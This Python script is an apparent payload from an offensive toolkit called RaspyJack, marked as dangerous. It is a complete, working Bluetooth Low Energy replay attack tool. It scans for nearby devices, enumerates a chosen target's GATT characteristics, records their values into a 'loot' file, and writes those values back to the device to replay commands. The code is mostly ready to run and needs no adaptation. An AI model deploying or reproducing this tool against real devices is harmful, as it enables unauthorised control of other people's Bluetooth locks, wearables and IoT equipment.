#!/usr/bin/env python3
# @name: BLE GATT Replay Attack
# @desc: Select a BLE target, enumerate GATT characteristics, record readable values or notifications, save sequences, and replay selected values to writable characteristics.
# @category: bluetooth
# @danger: true
# @active: true
# @web: true
"""
RaspyJack Payload -- BLE GATT Replay Attack
=============================================
Author: 7h30th3r0n3

Scan for BLE devices, connect to a target, enumerate GATT
characteristics, record notifications/reads, and replay recorded
values back to the device.

Setup / Prerequisites:
  - Requires Bluetooth adapter.
  - Requires gatttool (from bluez package).

Steps:
  1) Scan for BLE devices
  2) Select target and connect
  3) Enumerate GATT services/characteristics
  4) Record mode: log all GATT notifications and reads
  5) Replay mode: write recorded values back to device

Controls:
  python3 ble_replay.py [target_mac] [record [duration_seconds] | replay <sequence_file>]

    target_mac       -- optional BLE MAC address (AA:BB:CC:DD:EE:FF) to
                         target directly. If omitted, a scan runs and
                         you pick a target from a numbered list.
    record           -- record GATT values from the target.
        duration_seconds -- optional, how long to record (default:
                             run until Ctrl-C)
    replay            -- replay a previously exported sequence file
                          back to the target.
        sequence_file  -- path to a JSON file produced by a previous
                           record run (default: most recent export in
                           $CITYPOP_LOOT)

  If neither "record" nor "replay" is given, you'll be prompted to
  pick one from a numbered list.

  If more than one Bluetooth adapter is present, you'll be prompted to
  pick one from a numbered list.

  Ctrl-C    -- stop recording/replaying early and export/print a summary

Uses: gatttool, hcitool via subprocess
Loot: $CITYPOP_LOOT/ble_replay_<timestamp>.json
"""

from payloads._web_input import request_input
import os
import sys
import re
import json
import time
import asyncio
import threading
import subprocess
from datetime import datetime
from pathlib import Path

sys.path.append(os.path.abspath(os.path.join(__file__, "..", "..", "..")))

from payloads._iface_helper import list_bt_interfaces

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------
LOOT_DIR = Path(os.environ.get("CITYPOP_LOOT", "."))
LOOT_DIR.mkdir(parents=True, exist_ok=True)

HCI_DEV = None  # set in main() via _select_bt_interface
SCAN_TIMEOUT = 10

# ---------------------------------------------------------------------------
# Shared state
# ---------------------------------------------------------------------------
lock = threading.Lock()
devices = []            # list of dicts: {addr, name, rssi}
characteristics = []    # list of dicts: {handle, uuid, properties}
recorded_sequence = []  # list of dicts: {timestamp, handle, value}
scroll_pos = 0
status_msg = "Idle"
recording = False
replaying = False
target_device = None    # dict: {addr, name}
connected = False

# ---------------------------------------------------------------------------
# BLE scanning (bleak)
# ---------------------------------------------------------------------------

async def _bleak_scan(timeout=10):
    """Discover BLE devices using bleak (async)."""
    from bleak import BleakScanner
    found = await BleakScanner.discover(timeout=timeout)
    return [
        {"addr": d.address.upper(),
         "name": d.name or "(unknown)",
         "rssi": getattr(d, "rssi", -99)}
        for d in found
    ]


def _ble_scan():
    """Scan for BLE devices using bleak."""
    # Stop bluetoothd for raw HCI access, bring adapter up
    subprocess.run(["sudo", "systemctl", "stop", "bluetooth"],
                   capture_output=True, timeout=5)
    subprocess.run(["sudo", "hciconfig", HCI_DEV, "down"],
                   capture_output=True, timeout=5)
    subprocess.run(["sudo", "hciconfig", HCI_DEV, "up"],
                   capture_output=True, timeout=5)
    time.sleep(0.3)

    try:
        results = asyncio.run(_bleak_scan(SCAN_TIMEOUT))
    except Exception:
        results = []

    # De-duplicate by address
    found = {}
    for dev in results:
        addr = dev["addr"]
        if addr not in found:
            found[addr] = dev
        elif dev["name"] != "(unknown)" and found[addr]["name"] == "(unknown)":
            found[addr] = {**found[addr], "name": dev["name"]}

    return list(found.values())


def do_scan():
    """Run a BLE scan."""
    global devices, status_msg
    with lock:
        status_msg = "Scanning BLE..."
    found = _ble_scan()
    with lock:
        devices = found
        status_msg = f"Found {len(found)} devices"


# ---------------------------------------------------------------------------
# GATT enumeration
# ---------------------------------------------------------------------------

def _enumerate_characteristics(addr):
    """Enumerate GATT characteristics using gatttool."""
    chars = []

    try:
        # Primary services
        result = subprocess.run(
            ["gatttool", "-i", HCI_DEV, "-b", addr, "--primary"],
            capture_output=True, text=True, timeout=15,
        )
        services = []
        for line in result.stdout.splitlines():
            match = re.search(r"uuid:\s*([0-9a-fA-F-]+)", line)
            if match:
                services.append(match.group(1))

        # Characteristics
        result = subprocess.run(
            ["gatttool", "-i", HCI_DEV, "-b", addr, "--characteristics"],
            capture_output=True, text=True, timeout=15,
        )
        for line in result.stdout.splitlines():
            # handle = 0x000a, char properties = 0x12, char value handle = 0x000b, uuid = ...
            match = re.search(
                r"handle\s*=\s*(0x[0-9a-fA-F]+).*"
                r"properties\s*=\s*(0x[0-9a-fA-F]+).*"
                r"value handle\s*=\s*(0x[0-9a-fA-F]+).*"
                r"uuid\s*=\s*([0-9a-fA-F-]+)",
                line,
            )
            if match:
                chars.append({
                    "handle": match.group(1),
                    "properties": match.group(2),
                    "value_handle": match.group(3),
                    "uuid": match.group(4),
                })
    except subprocess.TimeoutExpired:
        pass
    except Exception:
        pass

    return chars


def do_connect(device):
    """Connect to device and enumerate characteristics."""
    global target_device, characteristics, connected, status_msg

    with lock:
        target_device = device
        status_msg = f"Connecting {device['addr'][-8:]}..."

    chars = _enumerate_characteristics(device["addr"])

    with lock:
        characteristics = chars
        connected = len(chars) > 0
        if connected:
            status_msg = f"{len(chars)} chars found"
        else:
            status_msg = "Connect failed / no chars"


# ---------------------------------------------------------------------------
# GATT read
# ---------------------------------------------------------------------------

def _read_characteristic(addr, handle):
    """Read a single GATT characteristic value."""
    try:
        result = subprocess.run(
            ["gatttool", "-i", HCI_DEV, "-b", addr,
             "--char-read", "-a", handle],
            capture_output=True, text=True, timeout=10,
        )
        match = re.search(r"value:\s*([0-9a-fA-F\s]+)", result.stdout)
        if match:
            return match.group(1).strip()
    except Exception:
        pass
    return None


def _write_characteristic(addr, handle, value):
    """Write a value to a GATT characteristic."""
    try:
        result = subprocess.run(
            ["gatttool", "-i", HCI_DEV, "-b", addr,
             "--char-write-req", "-a", handle, "-n", value.replace(" ", "")],
            capture_output=True, text=True, timeout=10,
        )
        return "successfully" in result.stdout.lower()
    except Exception:
        return False


# ---------------------------------------------------------------------------
# Record mode
# ---------------------------------------------------------------------------

def _record_loop():
    """Record all readable characteristics periodically."""
    global recording

    if not target_device or not characteristics:
        with lock:
            recording = False
        return

    addr = target_device["addr"]
    interval = 1.0

    while True:
        with lock:
            if not recording:
                break

        for char in characteristics:
            with lock:
                if not recording:
                    break

            value = _read_characteristic(addr, char["value_handle"])
            if value:
                entry = {
                    "timestamp": datetime.now().isoformat(),
                    "handle": char["value_handle"],
                    "uuid": char["uuid"],
                    "value": value,
                }
                with lock:
                    recorded_sequence.append(entry)
                    if len(recorded_sequence) > 1000:
                        recorded_sequence.pop(0)

        with lock:
            status_msg = f"Recorded: {len(recorded_sequence)} values"

        time.sleep(interval)


def start_recording():
    """Start recording GATT values."""
    global recording, status_msg
    with lock:
        if recording:
            return
        recording = True
        status_msg = "Recording..."
    threading.Thread(target=_record_loop, daemon=True).start()


def stop_recording():
    """Stop recording."""
    global recording, status_msg
    with lock:
        recording = False
        status_msg = f"Stopped. {len(recorded_sequence)} values"


# ---------------------------------------------------------------------------
# Replay mode
# ---------------------------------------------------------------------------

def _replay_loop():
    """Replay recorded values to the target device."""
    global replaying, status_msg

    if not target_device or not recorded_sequence:
        with lock:
            replaying = False
            status_msg = "Nothing to replay"
        return

    addr = target_device["addr"]

    with lock:
        seq = list(recorded_sequence)
        replaying = True

    total = len(seq)
    success_count = 0

    for i, entry in enumerate(seq):
        with lock:
            if not replaying:
                break
            status_msg = f"Replay {i + 1}/{total}"

        ok = _write_characteristic(addr, entry["handle"], entry["value"])
        if ok:
            success_count += 1
        time.sleep(0.2)

    with lock:
        replaying = False
        status_msg = f"Replayed: {success_count}/{total}"


def start_replay():
    """Start replaying recorded sequence."""
    global replaying, status_msg
    with lock:
        if replaying:
            return
        status_msg = "Replaying..."
    threading.Thread(target=_replay_loop, daemon=True).start()


def stop_replay():
    """Stop replay."""
    global replaying
    with lock:
        replaying = False


# ---------------------------------------------------------------------------
# Export
# ---------------------------------------------------------------------------

def export_sequence():
    """Export recorded sequence to loot."""
    with lock:
        if not recorded_sequence:
            return None
        data = {
            "target": target_device["addr"] if target_device else "unknown",
            "target_name": target_device["name"] if target_device else "unknown",
            "characteristics": list(characteristics),
            "sequence": list(recorded_sequence),
            "exported": datetime.now().isoformat(),
        }

    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    path = os.path.join(LOOT_DIR, f"ble_replay_{ts}.json")
    with open(path, "w") as f:
        json.dump(data, f, indent=2)
    return path


# ---------------------------------------------------------------------------
# Bluetooth adapter selection
# ---------------------------------------------------------------------------

def _select_bt_interface():
    """Detect BT interfaces and pick one. Prompts if more than one is found."""
    ifaces = list_bt_interfaces()

    if not ifaces:
        print("No Bluetooth adapter found.", flush=True)
        return None

    if len(ifaces) == 1:
        chosen = ifaces[0]
        if not chosen["is_up"]:
            subprocess.run(["sudo", "hciconfig", chosen["name"], "up"],
                           capture_output=True, timeout=5)
        return chosen["name"]

    print("Multiple Bluetooth adapters found:", flush=True)
    for i, ifc in enumerate(ifaces):
        mac = ifc["mac"] or "?"
        state = "UP" if ifc["is_up"] else "DOWN"
        print(f"  [{i}] {ifc['name']}  {ifc['bus'] or '?'}  {mac}  {state}", flush=True)

    while True:
        choice = str(request_input("Select Bluetooth adapter", input_type="select", choices=[
            {"value": str(i), "label": f"{item['name']} · {item.get('bus') or 'unknown'} · {item.get('mac') or 'no address'} · {'UP' if item.get('is_up') else 'DOWN'}"}
            for i, item in enumerate(ifaces)]))
        if choice.isdigit() and 0 <= int(choice) < len(ifaces):
            chosen = ifaces[int(choice)]
            if not chosen["is_up"]:
                subprocess.run(["sudo", "hciconfig", chosen["name"], "up"],
                               capture_output=True, timeout=5)
            return chosen["name"]
        print("Invalid selection, try again.", flush=True)


# ---------------------------------------------------------------------------
# Target selection
# ---------------------------------------------------------------------------

_MAC_RE = re.compile(r"^[0-9A-Fa-f]{2}(:[0-9A-Fa-f]{2}){5}$")


def _select_target():
    """Scan for BLE devices and let the operator pick one by number."""
    print("Scanning for BLE devices...", flush=True)
    do_scan()

    with lock:
        devs = list(devices)
        msg = status_msg

    print(msg, flush=True)
    if not devs:
        return None

    for i, dev in enumerate(devs):
        print(f"  [{i}] {dev['addr']}  {dev['name']}", flush=True)

    while True:
        choice = str(request_input("Select Bluetooth target", input_type="select", choices=[
            {"value": str(i), "label": f"{item.get('name') or 'unknown'} · {item.get('addr') or 'no address'}"}
            for i, item in enumerate(devs)]))
        if choice.isdigit() and 0 <= int(choice) < len(devs):
            return devs[int(choice)]
        print("Invalid selection, try again.", flush=True)


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def _usage():
    print(f"Usage: {os.path.basename(__file__)} [target_mac] "
          f"[record [duration_seconds] | replay <sequence_file>]", flush=True)
    print("  target_mac        BLE MAC, e.g. AA:BB:CC:DD:EE:FF "
          "(optional; omit to scan and pick a target)", flush=True)
    print("  record            record GATT values from the target", flush=True)
    print("    duration_seconds  optional, seconds to record (default: until Ctrl-C)", flush=True)
    print("  replay <file>     replay a previously exported sequence file", flush=True)


def main():
    global status_msg, HCI_DEV, target_device

    args = sys.argv[1:]
    if args and args[0] in ("-h", "--help"):
        _usage()
        return 0

    target_mac = None
    if args and _MAC_RE.match(args[0]):
        target_mac = args[0].upper()
        args = args[1:]

    action = None
    action_arg = None
    if args and args[0].lower() in ("record", "replay"):
        action = args[0].lower()
        args = args[1:]
        if args:
            action_arg = args[0]

    HCI_DEV = _select_bt_interface()
    if not HCI_DEV:
        return 1

    if target_mac:
        target = {"addr": target_mac, "name": "(unspecified)"}
    else:
        target = _select_target()
        if not target:
            print("No target selected. Exiting.", flush=True)
            return 1

    print(f"Connecting to {target['addr']} ...", flush=True)
    do_connect(target)
    with lock:
        chars = list(characteristics)
        conn_ok = connected

    if not conn_ok:
        print("Connect failed or no characteristics found. Exiting.", flush=True)
        return 1

    print(f"Found {len(chars)} characteristics:", flush=True)
    for ch in chars:
        print(f"  handle={ch['value_handle']} uuid={ch['uuid']} "
              f"properties={ch['properties']}", flush=True)

    if not action:
        print("\n  [1] record  -- log GATT notifications/reads from the target", flush=True)
        print("  [2] replay  -- write a previously recorded sequence back", flush=True)
        while True:
            choice = request_input("Select action [1-2]: ").strip()
            if choice == "1":
                action = "record"
                break
            elif choice == "2":
                action = "replay"
                break
            print("Invalid selection, try again.", flush=True)

    try:
        if action == "record":
            duration = None
            if action_arg:
                try:
                    duration = float(action_arg)
                except ValueError:
                    _usage()
                    return 1

            if duration:
                print(f"Recording for {duration:.0f}s ...", flush=True)
            else:
                print("Recording until Ctrl-C ...", flush=True)

            start_recording()
            start_time = time.time()
            try:
                while True:
                    time.sleep(2.0)
                    with lock:
                        n = len(recorded_sequence)
                        msg = status_msg
                    elapsed = time.time() - start_time
                    print(f"[{elapsed:6.1f}s] {msg}", flush=True)
                    if duration and elapsed >= duration:
                        break
            except KeyboardInterrupt:
                print("\nStopping recording...", flush=True)
            stop_recording()

            path = export_sequence()
            with lock:
                n = len(recorded_sequence)
            if path:
                print(f"Recorded {n} values. Exported to {path}", flush=True)
            else:
                print("Nothing recorded.", flush=True)

        else:  # replay
            seq_path = action_arg
            if not seq_path:
                seq_path = request_input("Path to sequence file: ").strip()
            if not seq_path or not os.path.isfile(seq_path):
                print(f"Sequence file not found: {seq_path!r}", flush=True)
                return 1

            with open(seq_path) as fh:
                data = json.load(fh)
            with lock:
                recorded_sequence.clear()
                recorded_sequence.extend(data.get("sequence", []))
                n = len(recorded_sequence)

            print(f"Loaded {n} recorded values from {seq_path}", flush=True)
            print(f"Replaying to {target['addr']} ...", flush=True)

            start_replay()
            try:
                while True:
                    time.sleep(0.5)
                    with lock:
                        active = replaying
                        msg = status_msg
                    if not active:
                        print(msg, flush=True)
                        break
                    print(msg, flush=True)
            except KeyboardInterrupt:
                print("\nStopping replay...", flush=True)
                stop_replay()

    finally:
        stop_recording()
        stop_replay()

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
